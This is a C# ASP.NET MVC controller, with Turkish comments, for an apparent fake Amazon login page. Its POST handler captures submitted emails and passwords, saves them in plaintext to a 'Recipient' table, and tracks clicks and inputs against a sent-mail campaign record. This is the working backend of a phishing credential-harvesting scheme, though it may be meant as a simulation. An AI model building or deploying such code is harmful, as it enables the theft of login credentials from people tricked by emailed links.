using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using WebApplicationMVC2.Models;

namespace WebApplicationMVC2.Controllers
{
    public class AmazonLoginController : Controller
    {
        private readonly RecipientModel _context;

        public AmazonLoginController()
        {
            _context = new RecipientModel();
        }
        public ActionResult AmazonLogin()
        {
            return View();
        }

        [HttpPost]
        public ActionResult AmazonLogin(string email, string password)
        {
            var existingUser = _context.Recipient.SingleOrDefault(u => u.Email == email);

            if (existingUser != null)
            {
                // Kullanıcı zaten var, sadece TotalClicks değerini 1 arttır
                existingUser.TotalClicks += 1;
                _context.SaveChanges();

                // İstediğiniz sayfaya yönlendirme yapabilirsiniz
                return RedirectToAction("Index", "Home");
            }

            var recipient = new Recipient
            {
                Email = email,
                Password = password,
                TotalClicks = 1
            };
            
            var sentMailData = _context.SentMailData.OrderBy(p => p.ID).FirstOrDefault();
            sentMailData.AmazonInputs++;

            recipient.EnterDate = DateTime.Now;
            _context.Recipient.Add(recipient);
            _context.SaveChanges();

            return RedirectToAction("Index", "Home");
        }
    }
}